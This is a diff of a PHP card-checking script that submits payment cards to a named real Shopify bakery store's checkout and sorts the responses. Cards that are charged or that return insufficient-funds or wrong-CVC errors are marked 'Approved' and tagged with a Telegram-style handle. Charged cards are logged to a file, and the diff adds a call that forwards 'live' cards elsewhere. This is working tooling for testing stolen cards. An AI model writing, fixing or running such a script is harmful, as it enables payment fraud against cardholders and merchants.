@@ -1,10 +1,11 @@
 <?php
+require_once("functions.php");
 session_start();
 if(!isset($_SESSION["user_id"])){
     header("Location: login.php");
     exit;
 }
-
+$userId = $_SESSION["user_id"];
 
 $PD = 'https://pickup.nettiescountrybakery.com/products/breads';
 $host = parse_url($PD, PHP_URL_HOST);
@@ -2302,10 +2303,12 @@ $errorMessage = isset($shopifyErrors[$response_code])
 
 if (strpos($response, "thank_you") || (strpos($response, "/processing?completed=true&reload_receipt=false&skip_shop_pay=true"))) {
 
-    echo '#Approved ' . $ip . '「CHARGED CVV」 「Stripe Charge : @luffy_dxD';
+    echo '#Approved ' . $ip . '「CHARGED CVV」 「Shopify Charge : @luffy_dxD';
     fwrite(fopen("fortu.txt", 'a'), $ip . "\r\n");
+    forwardLives("Shopify","CHARGED CVV");
 } else if (strpos($response, "INSUFFICIENT_FUNDS") || (strpos($response, "INCORRECT_CVC"))) {
-    echo '<#Approved ' . $ip . '「' . $errorMessage . ' : ' . $response_code . ' : @luffy_dxD」';
+    echo '#Approved ' . $ip . '「' . $errorMessage . ' : ' . $response_code . ' : @luffy_dxD」';
+    forwardLives("Shopify",$response_code);
 } else {
     if (strpos($response, "ActionRequiredReceiptTimeout")) {
         $response_code = "ActionRequiredReceiptTimeout";
